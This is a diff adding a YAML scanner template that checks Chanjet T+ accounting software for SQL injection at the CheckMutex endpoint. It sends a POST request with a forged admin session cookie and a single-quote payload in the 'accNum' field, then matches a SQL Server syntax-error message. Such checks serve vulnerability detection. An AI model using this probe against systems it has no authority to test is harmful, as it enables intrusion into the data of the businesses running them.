@@ -1,0 +1,12 @@
+cve-id: chanjettplus-CheckMutex-sqli
+rules:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex
+  headers:
+    Content-Type: text/plain
+    Cookie: 'ASP.NET_SessionId=; sid=admin '
+  body: |
+    {"accNum": "6'", "functionTag": "SYS0104", "url": ""}
+  expression: 'response.body.bcontains(b"附近有语法错误") '
+severity: critical
+type: sqli
